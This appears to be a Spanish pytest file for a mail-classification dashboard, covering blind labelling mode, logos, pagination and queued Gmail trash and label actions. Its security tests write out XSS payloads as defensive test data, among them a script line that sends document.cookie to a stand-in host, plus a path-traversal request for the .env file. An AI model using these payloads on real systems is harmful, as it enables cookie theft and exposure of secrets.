"""
Tests del dashboard (Fase 8).

El dashboard es la primera parte del sistema que renderiza en pantalla texto
escrito por terceros: el asunto lo escribe quien manda el correo y la
explicación la escribe un LLM que ha leído ese correo. Por eso el test más
importante de este archivo no es que la lista se vea bonita, sino que un correo
hostil no consiga inyectar HTML.
"""

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import select

from mailpilot import web
from mailpilot.api import app
from mailpilot.db import get_session
from mailpilot.models import (
    ActionProposal,
    Category,
    Email,
    GmailAction,
    GmailActionStatus,
    GmailActionType,
    ProposalStatus,
)
from mailpilot.repository import (
    decidir_propuesta,
    generar_propuestas,
    save_classification,
    upsert_emails,
)
from tests.test_repository import make_email

pytestmark = pytest.mark.db


@pytest.fixture
def client(session):
    app.dependency_overrides[get_session] = lambda: session
    with TestClient(app) as test_client:
        yield test_client
    app.dependency_overrides.clear()


def propuesta_lista(session, categoria=Category.PROMOCIONES, razon="porque sí", **campos):
    """Deja una propuesta pendiente y la devuelve."""
    email_data = make_email(campos.pop("message_id", "a"), **campos)
    upsert_emails(session, [email_data])
    email = session.execute(
        select(Email).where(Email.gmail_message_id == email_data.gmail_message_id)
    ).scalar_one()

    save_classification(
        session,
        email_id=email.id,
        category=categoria,
        confidence=0.9,
        reasoning=razon,
        model_used="qwen3:8b",
    )
    generar_propuestas(session)

    return session.execute(
        select(ActionProposal).where(ActionProposal.email_id == email.id)
    ).scalar_one()


# ---------------------------------------------------------------------------
# Lo que se ve
# ---------------------------------------------------------------------------


def test_pinta_las_propuestas_pendientes(client, session):
    propuesta_lista(
        session,
        categoria=Category.TRABAJO,
        razon="es una oferta de empleo",
        subject="Entrevista el jueves",
        sender="rrhh@empresa.com",
    )

    html = client.get("/").text

    assert "Entrevista el jueves" in html
    assert "rrhh@empresa.com" in html
    assert "es una oferta de empleo" in html


def test_marca_la_categoria_que_propuso_el_modelo(client, session):
    """
    El chip de la categoría propuesta se pinta distinto: pulsarlo es aprobar,
    pulsar otro es corregir. Si se perdiera esa marca, la usuaria no sabría
    qué le está proponiendo el modelo.
    """
    propuesta_lista(session, categoria=Category.TRABAJO)

    html = client.get("/").text

    assert 'class="chip propuesta-actual"' in html
    assert 'data-categoria="trabajo"' in html
    # Están las siete opciones, no solo la propuesta: corregir es un clic.
    for categoria in Category:
        assert f'data-categoria="{categoria.value}"' in html


def test_las_decididas_desaparecen_de_la_pantalla(client, session):
    propuesta = propuesta_lista(session, subject="Ya la decidí")
    decidir_propuesta(session, propuesta.id, ProposalStatus.APPROVED)

    html = client.get("/").text

    assert "Ya la decidí" not in html
    assert "No hay nada pendiente" in html


def test_estado_vacio(client):
    respuesta = client.get("/")

    assert respuesta.status_code == 200
    assert "No hay nada pendiente" in respuesta.text


def test_muestra_el_acierto_real(client, session):
    """
    Dos decisiones, una aceptada y una corregida => 50 % de acierto.

    Este número sale del uso real, no del conjunto de evaluación de la Fase 6:
    cada corrección es una etiqueta correcta conseguida sin etiquetar a mano.
    """
    primera = propuesta_lista(session, Category.PROMOCIONES, message_id="a")
    segunda = propuesta_lista(session, Category.PROMOCIONES, message_id="b")

    decidir_propuesta(session, primera.id, ProposalStatus.APPROVED)
    decidir_propuesta(session, segunda.id, ProposalStatus.MODIFIED, Category.TRABAJO)

    html = client.get("/").text

    assert "50 %" in html
    assert "acierto real" in html


# ---------------------------------------------------------------------------
# Modo ciego
# ---------------------------------------------------------------------------


def test_el_modo_ciego_oculta_lo_que_dijo_el_modelo(client, session):
    """
    En modo ciego no debe verse NADA de la respuesta del modelo: ni el chip
    resaltado, ni el ✓, ni la explicación, ni el acierto acumulado.

    No es cosmética. Ver la respuesta antes de pensar la tuya sesga hacia darle
    la razón, y con etiquetas así el acierto medido sale inflado. Es el mismo
    error que costó 18,7 puntos en la Fase 6, por otro camino.
    """
    propuesta_lista(session, categoria=Category.TRABAJO, razon="es una oferta de empleo")

    html = client.get("/?ciego=1").text

    assert "es una oferta de empleo" not in html
    # Con espacio: así se busca el atributo renderizado `class="chip
    # propuesta-actual"` y no la regla CSS `.chip.propuesta-actual`, que sigue
    # estando en la hoja de estilos aunque no la use nadie.
    assert "chip propuesta-actual" not in html
    # `✓ <categoría>`, no el ✓ suelto: ese carácter también aparece dentro del
    # JavaScript de la vista de revisadas, y ahí no delata nada.
    for categoria in Category:
        assert f"✓ {categoria.value}" not in html
    assert "acierto real" not in html


def test_el_modo_ciego_sigue_dejando_decidir(client, session):
    """
    Se oculta la pista visual, no la funcionalidad: los siete botones siguen
    ahí y el navegador sigue sabiendo si tu clic es aprobar o corregir.
    """
    propuesta_lista(session, categoria=Category.TRABAJO)

    html = client.get("/?ciego=1").text

    for categoria in Category:
        assert f'data-categoria="{categoria.value}"' in html
    assert 'data-propuesta="1"' in html
    assert "Modo ciego" in html


def test_el_modo_normal_sigue_enseñandolo_todo(client, session):
    """El modo ciego se pide a propósito; por defecto no se activa."""
    propuesta_lista(session, categoria=Category.TRABAJO, razon="es una oferta de empleo")

    html = client.get("/").text

    assert "es una oferta de empleo" in html
    assert "propuesta-actual" in html
    assert "Modo ciego" not in html


# ---------------------------------------------------------------------------
# Imágenes
# ---------------------------------------------------------------------------


def test_sin_logo_la_cabecera_no_pinta_imagen_rota(client, session, tmp_path, monkeypatch):
    """
    El caso normal al empezar: static/ no tiene logo todavía.

    La página tiene que salir entera y sin ninguna etiqueta <img>, no con el
    icono de imagen rota que saldría si se apuntara siempre a una ruta fija.
    """
    monkeypatch.setattr(web, "STATIC_DIR", tmp_path)

    html = client.get("/").text

    assert "<img" not in html
    assert "MailPilot" in html


@pytest.mark.parametrize("extension", ["svg", "png", "webp", "jpg"])
def test_el_logo_aparece_solo_con_que_exista_el_archivo(
    client, session, tmp_path, monkeypatch, extension
):
    """
    Poner `logo.png` en static/ basta: no hay que tocar la plantilla ni
    reiniciar uvicorn, porque el archivo se busca en cada petición.
    """
    monkeypatch.setattr(web, "STATIC_DIR", tmp_path)
    (tmp_path / f"logo.{extension}").write_bytes(b"no importa el contenido")

    html = client.get("/").text

    assert f'src="/static/logo.{extension}"' in html


def test_el_favicon_es_opcional_igual(client, session, tmp_path, monkeypatch):
    monkeypatch.setattr(web, "STATIC_DIR", tmp_path)
    (tmp_path / "favicon.png").write_bytes(b"x")

    assert 'rel="icon" href="/static/favicon.png"' in client.get("/").text


def test_hay_una_variante_de_logo_para_el_tema_oscuro(client, session, tmp_path, monkeypatch):
    """
    El logo lleva el texto en marino sobre fondo transparente: sobre el fondo
    oscuro sería invisible. <picture> cambia de archivo según el tema del
    sistema, sin JavaScript.
    """
    monkeypatch.setattr(web, "STATIC_DIR", tmp_path)
    (tmp_path / "logo.png").write_bytes(b"x")
    (tmp_path / "logo-oscuro.png").write_bytes(b"x")

    html = client.get("/").text

    assert 'srcset="/static/logo-oscuro.png" media="(prefers-color-scheme: dark)"' in html
    assert 'src="/static/logo.png"' in html


def test_sin_variante_oscura_se_usa_el_logo_normal(client, session, tmp_path, monkeypatch):
    """Tener solo un logo tiene que seguir funcionando, sin <source> vacío."""
    monkeypatch.setattr(web, "STATIC_DIR", tmp_path)
    (tmp_path / "logo.svg").write_bytes(b"x")

    html = client.get("/").text

    assert 'src="/static/logo.svg"' in html
    assert "<source" not in html


def test_no_se_puede_salir_de_la_carpeta_de_assets(client):
    """
    Montar una carpeta estática la publica ENTERA. Lo que no debe publicar es
    lo que hay por encima: `credentials/`, `.env`, la base de datos.

    Starlette normaliza la ruta y rechaza los `..`, así que este intento de
    subir cuatro niveles hasta el .env no devuelve 200. El test está para que
    siga siendo verdad si algún día se cambia cómo se sirven las imágenes.
    """
    respuesta = client.get("/static/../../../../.env")

    assert respuesta.status_code != 200


# ---------------------------------------------------------------------------
# Seguridad
# ---------------------------------------------------------------------------


def test_un_correo_hostil_no_inyecta_html(client, session):
    """
    EL TEST IMPORTANTE DE LA FASE 8.

    El asunto lo escribe quien manda el correo, y la explicación la escribe un
    modelo que acaba de leer ese correo. Los dos son texto de origen no fiable
    pintado en una página.

    El proyecto ya impide que un correo consiga que el modelo PROPONGA algo
    (esquema cerrado). Esta es la otra mitad: que tampoco consiga EJECUTAR algo
    en el navegador de la usuaria.

    Lo garantiza el autoescapado de Jinja2. Si alguien añade `|safe` a estos
    campos en la plantilla, este test se pone rojo.
    """
    propuesta_lista(
        session,
        subject="<script>alert('robado')</script>",
        sender="<img src=x onerror=alert(1)>@malo.com",
        razon="<script>fetch('http://malo/'+document.cookie)</script>",
    )

    html = client.get("/").text

    # El texto sigue estando: escapado, se LEE pero no se EJECUTA.
    assert "&lt;script&gt;" in html

    # Lo que importa es que no haya llegado a abrirse ninguna etiqueta. Basta
    # con que `<` sea `&lt;` para que el navegador lo trate como texto: la
    # cadena `onerror=alert(1)` puede aparecer y es inofensiva mientras no
    # forme parte de una etiqueta de verdad.
    assert "<script>alert" not in html
    assert "<script>fetch" not in html
    # `<img src=x`, no `<img` a secas: la cabecera lleva un <img> legítimo con
    # el logo. Lo que no puede existir es la etiqueta que venía en el correo.
    assert "<img src=x" not in html


def test_el_dashboard_no_escribe_nada():
    """
    El dashboard sirve HTML y punto: todas sus rutas son GET.

    Las decisiones las manda el navegador a los endpoints JSON de api.py, que
    son el único camino de escritura del sistema. Si algún día alguien añade
    aquí un POST que escriba directamente, se saltaría las reglas de
    `decidir_propuesta` (una decisión por propuesta, no sobrescribir lo que
    dijo el modelo, registro de auditoría).
    """
    from mailpilot import web

    for route in web.router.routes:
        assert route.methods == {"GET"}, f"{route.path} escribe algo"


# ---------------------------------------------------------------------------
# Vista de ya revisadas
# ---------------------------------------------------------------------------


def test_clasificados_marca_TU_eleccion_no_la_del_modelo(client, session):
    """
    La diferencia clave entre las dos vistas.

    En pendientes el chip resaltado es lo que propone el modelo; en revisadas
    es lo que elegiste tú. Si aquí se resaltara la del modelo, verías marcada
    una categoría que precisamente habías descartado.
    """
    propuesta = propuesta_lista(session, categoria=Category.PROMOCIONES)
    decidir_propuesta(session, propuesta.id, ProposalStatus.MODIFIED, Category.TRABAJO)

    html = client.get("/clasificados").text

    assert '<button class="chip propuesta-actual"\n                    data-categoria="trabajo"' in html
    assert "El modelo dijo <b>promociones</b>" in html
    assert "tú elegiste" in html


def test_los_clasificados_se_pueden_rectificar(client, session):
    """Todo clic en esta vista va a /rectify, que no devuelve 409."""
    propuesta = propuesta_lista(session)
    decidir_propuesta(session, propuesta.id, ProposalStatus.APPROVED)

    html = client.get("/clasificados").text
    assert 'data-rectificar="1"' in html

    respuesta = client.post(
        f"/proposals/{propuesta.id}/rectify", json={"category": "avisos"}
    )

    assert respuesta.status_code == 200
    assert respuesta.json()["final_category"] == "avisos"
    assert respuesta.json()["category"] == "promociones"   # lo del modelo, intacto


def test_las_pendientes_no_salen_en_clasificados_ni_al_reves(client, session):
    pendiente = propuesta_lista(session, message_id="a", subject="Sin decidir")
    decidida = propuesta_lista(session, message_id="b", subject="Ya decidida")
    decidir_propuesta(session, decidida.id, ProposalStatus.APPROVED)

    revisadas = client.get("/clasificados").text
    assert "Ya decidida" in revisadas
    assert "Sin decidir" not in revisadas

    pendientes = client.get("/").text
    assert "Sin decidir" in pendientes
    assert "Ya decidida" not in pendientes


def test_rectificar_algo_pendiente_da_409(client, session):
    """
    El 409 de la Fase 7 sigue en pie: rectificar no es un atajo para saltárselo.
    """
    propuesta = propuesta_lista(session)

    respuesta = client.post(
        f"/proposals/{propuesta.id}/rectify", json={"category": "avisos"}
    )

    assert respuesta.status_code == 409


def test_los_clasificados_tienen_paginacion(client, session):
    """
    Las decididas no desaparecen al tocarlas, así que la lista solo crece y
    necesita paginar de verdad, a diferencia de la de pendientes.
    """
    for n in range(3):
        p = propuesta_lista(session, message_id=f"m{n}", subject=f"Correo {n}")
        decidir_propuesta(session, p.id, ProposalStatus.APPROVED)

    html = client.get("/clasificados?limit=2").text

    assert "1–2 de 3" in html
    assert "/clasificados?offset=2&limit=2" in html


# ---------------------------------------------------------------------------
# Acciones sobre Gmail (Fase 9)
# ---------------------------------------------------------------------------


def test_la_papelera_es_un_gesto_aparte_de_los_chips(client, session):
    """
    ADR 002 hecho interfaz.

    Si "papelera" fuera un chip más, elegirlo sustituiría a elegir categoría y
    tendrías que decidir entre decir qué es y decir que no lo quieres. Va en su
    propia fila, separada por una línea.
    """
    propuesta_lista(session)

    html = client.get("/").text

    assert 'data-papelera="1"' in html
    assert "papelera-fila" in html
    # No se ha colado como una categoría más.
    assert 'data-categoria="papelera"' not in html
    for categoria in Category:
        assert f'data-categoria="{categoria.value}"' in html


def test_en_modo_ciego_no_hay_papelera(client, session):
    """
    Etiquetando a ciegas se mide, no se gestiona. Un botón destructivo ahí
    solo puede dar disgustos.
    """
    propuesta_lista(session)

    assert 'data-papelera="1"' not in client.get("/?ciego=1").text


def test_pedir_papelera_no_toca_gmail_todavia(client, session):
    """
    LA SEPARACIÓN QUE HACE REVISABLE UNA ACCIÓN DESTRUCTIVA.

    Pedir solo escribe una fila `pending`. Entre decidir y que Gmail cambie hay
    un paso más, deliberado, para poder ver qué está a punto de pasar.
    """
    propuesta = propuesta_lista(session)

    respuesta = client.post(f"/emails/{propuesta.email_id}/trash")

    assert respuesta.status_code == 200
    accion = session.execute(
        select(GmailAction).where(GmailAction.action == GmailActionType.MOVE_TO_TRASH)
    ).scalar_one()
    assert accion.status is GmailActionStatus.PENDING
    assert accion.executed_at is None


def test_pedir_papelera_dos_veces_no_encola_dos(client, session):
    """Dos clics seguidos no son un error de la usuaria."""
    propuesta = propuesta_lista(session)

    client.post(f"/emails/{propuesta.email_id}/trash")
    segunda = client.post(f"/emails/{propuesta.email_id}/trash")

    assert segunda.status_code == 200
    assert segunda.json()["pedida"] is False
    assert len(session.execute(select(GmailAction)).scalars().all()) == 1


def test_papelera_de_un_correo_inexistente(client):
    assert client.post("/emails/99999/trash").status_code == 404


def test_aprobar_una_categoria_encola_su_etiqueta(client, session):
    """
    Aceptar una categoría es pedir que se etiquete: `categorize` era justo la
    acción propuesta. Rechazar no encola nada.
    """
    propuesta = propuesta_lista(session)

    client.post(f"/proposals/{propuesta.id}/approve")

    accion = session.execute(select(GmailAction)).scalar_one()
    assert accion.action is GmailActionType.APPLY_LABEL
    assert accion.status is GmailActionStatus.PENDING


def test_rechazar_no_encola_ninguna_etiqueta(client, session):
    propuesta = propuesta_lista(session)

    client.post(f"/proposals/{propuesta.id}/reject")

    assert session.execute(select(GmailAction)).scalars().all() == []


def test_la_barra_avisa_de_que_gmail_no_ha_cambiado(client, session):
    propuesta = propuesta_lista(session)
    client.post(f"/proposals/{propuesta.id}/approve")

    html = client.get("/").text

    assert "acciones esperando" in html
    assert "no</b> ha cambiado nada en Gmail" in html


def test_recupera_las_decisiones_anteriores_a_la_fase_9(client, session):
    """
    Las decisiones tomadas antes de que existiera el eje de acciones no
    encolaron nada. Sin esto habría que volver a pulsar correo por correo algo
    que ya estaba decidido.
    """
    propuesta = propuesta_lista(session)
    decidir_propuesta(session, propuesta.id, ProposalStatus.APPROVED)
    # Simula el estado de antes: decidida pero sin acción encolada.
    for accion in session.execute(select(GmailAction)).scalars().all():
        session.delete(accion)
    session.commit()

    assert "decisiones tuyas todavía no tienen etiqueta" in client.get("/").text

    respuesta = client.post("/actions/backfill")

    assert respuesta.json()["encoladas"] == 1
    accion = session.execute(select(GmailAction)).scalar_one()
    assert accion.action is GmailActionType.APPLY_LABEL
    assert accion.status is GmailActionStatus.PENDING
    assert accion.action_proposal_id == propuesta.id


def test_recuperar_dos_veces_no_duplica(client, session):
    propuesta = propuesta_lista(session)
    decidir_propuesta(session, propuesta.id, ProposalStatus.APPROVED)

    assert client.post("/actions/backfill").json()["encoladas"] == 0
    assert len(session.execute(select(GmailAction)).scalars().all()) == 1


def test_lo_rechazado_no_se_recupera(client, session):
    """Rechazar sigue significando "no apliques nada", también hacia atrás."""
    propuesta = propuesta_lista(session)
    decidir_propuesta(session, propuesta.id, ProposalStatus.REJECTED)

    assert client.post("/actions/backfill").json()["encoladas"] == 0


# ---------------------------------------------------------------------------
# Pestaña de papelera
# ---------------------------------------------------------------------------


def en_papelera(session, email_id):
    session.get(Email, email_id).en_papelera = True
    session.commit()


def test_la_papelera_enseña_lo_tirado_desde_gmail(client, session):
    """
    Lo importante de esta pestaña: enseña el ESTADO ACTUAL de Gmail, no lo que
    hizo MailPilot. Un correo que la usuaria arrastró a la papelera desde Gmail
    no tiene ninguna acción detrás, y aun así tiene que salir.
    """
    propuesta = propuesta_lista(session, subject="Tirado desde Gmail")
    en_papelera(session, propuesta.email_id)

    html = client.get("/papelera").text

    assert "Tirado desde Gmail" in html
    assert session.execute(select(GmailAction)).scalars().all() == []


def test_lo_tirado_desaparece_de_pendientes(client, session):
    """
    EL MOTIVO DE TODO ESTO.

    Preguntar por un correo que ya tiraste es hacerte perder el tiempo con una
    decisión que ya tomaste, aunque la tomaras desde Gmail y no desde aquí.
    """
    propuesta = propuesta_lista(session, subject="Ya lo tiré")
    assert "Ya lo tiré" in client.get("/").text

    en_papelera(session, propuesta.email_id)

    assert "Ya lo tiré" not in client.get("/").text


def test_lo_tirado_no_sale_en_clasificados(client, session):
    """Cada correo en una sola pestaña: la papelera manda sobre clasificado."""
    propuesta = propuesta_lista(session, subject="Clasificado y tirado")
    decidir_propuesta(session, propuesta.id, ProposalStatus.APPROVED)
    en_papelera(session, propuesta.email_id)

    assert "Clasificado y tirado" not in client.get("/clasificados").text
    assert "Clasificado y tirado" in client.get("/papelera").text


def test_la_papelera_conserva_la_clasificacion(client, session):
    """
    ADR 002 otra vez: tirar no borra la etiqueta ni la saca del cálculo del
    acierto. La pestaña lo dice en voz alta para que no parezca perdido.
    """
    propuesta = propuesta_lista(session, categoria=Category.PROMOCIONES)
    decidir_propuesta(session, propuesta.id, ProposalStatus.APPROVED)
    antes = client.get("/").text
    en_papelera(session, propuesta.email_id)

    html = client.get("/papelera").text

    assert "promociones</b>" in html
    assert "se conserva para medir al modelo" in html


def test_las_tres_pestanas_estan_siempre(client, session):
    for ruta in ("/", "/clasificados", "/papelera"):
        html = client.get(ruta).text
        assert 'href="/"' in html
        assert 'href="/clasificados"' in html
        assert 'href="/papelera"' in html
